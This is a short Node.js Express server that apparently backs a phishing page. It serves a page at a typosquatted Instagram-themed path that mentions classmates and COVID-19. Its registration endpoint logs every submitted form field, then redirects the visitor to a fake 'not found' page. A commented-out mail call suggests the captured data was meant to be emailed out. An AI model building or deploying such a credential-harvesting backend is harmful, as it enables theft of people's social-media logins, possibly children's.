var http = require('http');
var express = require('express');
const sendMail =  require('./mail');
const path = require('path');
var app = express();

app.use('/instagranm/5bsinif/instalife/sheir/classmates/covid-19',express.static('public'));

app.use(express.urlencoded({
    extended:false
}));
app.use(express.json());

app.get('/not-found', (req,res) => {
    res.sendFile(path.join(__dirname,'notfound.html'))
});

app.get('/instagranm/5bsinif/instalife/sheir/classmates/covid-19', (req,res) => {
      res.sendFile(path.join(__dirname,'index.html'))
});


app.get('/', (req,res) => {
  // res.redirect('/instagranm/5bsinif/instalife/sheir/classmates/covid-19')
  res.sendFile(path.join(__dirname,'index.html'))
});

app.post('/registration', (req,res) => {
    console.log('Data',req.body);
   // sendMail();
   res.redirect('/not-found')
});

 

app.listen(80, ()=>{
    console.log('server is listening')
})